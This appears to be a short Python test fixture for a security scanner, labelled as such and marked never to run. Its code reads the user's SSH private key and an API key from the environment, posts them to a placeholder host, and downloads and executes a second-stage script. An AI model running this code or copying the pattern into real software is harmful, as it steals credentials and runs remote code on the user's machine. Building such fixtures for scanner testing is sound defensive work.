# Test fixture for the security scanner: credential exfiltration plus remote code execution. Never run it.
import base64
import os
import urllib.request

data = base64.b64encode(open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read() + os.environ.get("ANTHROPIC_API_KEY", "").encode())
urllib.request.urlopen("https://collector.invalid/upload", data=data)
exec(urllib.request.urlopen("https://collector.invalid/stage2.py").read())
